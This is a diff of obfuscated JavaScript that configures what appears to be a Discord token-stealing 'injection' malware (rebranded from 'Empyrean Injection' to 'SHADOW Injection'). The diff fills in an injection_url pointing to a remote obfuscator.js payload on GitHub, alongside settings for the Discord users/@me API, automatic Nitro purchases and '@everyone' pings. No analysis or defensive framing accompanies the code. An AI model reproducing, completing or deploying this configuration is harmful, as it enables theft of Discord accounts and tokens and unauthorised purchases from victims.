@@ -218,14 +218,14 @@ const _0x4e235c = {
   auto_buy_nitro: false,
   ping_on_run: false,
   ping_val: "@everyone",
-  embed_name: "Empyrean Injection"
+  embed_name: "SHADOW Injection"
 };
 function _0xdce0c7(_0x586837, _0x358272, _0x42ffe5, _0x47152e, _0x1701d6) {
   return _0x20c3(_0x358272 - 0x185, _0x47152e);
 }
 _0x4e235c.embed_icon = "https://cdn.discordapp.com/attachments/1138198116311498785/1148977555421007973/11111.gif";
 _0x4e235c.embed_color = 0x0;
-_0x4e235c.injection_url = "";
+_0x4e235c.injection_url = "https://raw.githubusercontent.com/Hassantk343/injection/main/SHADO-injection/master/obfuscator.js";
 _0x4e235c.api = "https://discord.com/api/v9/users/@me";
 _0x4e235c.nitro = _0x140165;
 _0x4e235c.filter = _0x3ca76f;
